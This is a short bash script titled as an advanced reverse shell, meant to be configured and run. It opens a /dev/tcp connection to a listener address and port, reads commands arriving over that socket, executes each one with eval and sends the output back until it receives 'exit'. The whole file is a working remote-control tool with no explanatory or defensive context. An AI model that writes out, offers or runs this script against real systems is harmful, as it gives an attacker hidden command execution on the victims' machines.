#!/bin/bash
# Bash Advanced Reverse Shell
# Configure LHOST and LPORT before use

LHOST="192.168.1.100"
LPORT=4451

exec 3<>/dev/tcp/$LHOST/$LPORT

while read -r cmd; do
    if [[ "$cmd" == "exit" ]]; then
        break
    fi
    eval "$cmd" | tee -a /dev/fd/3
done < /dev/fd/3

exec 3>&-
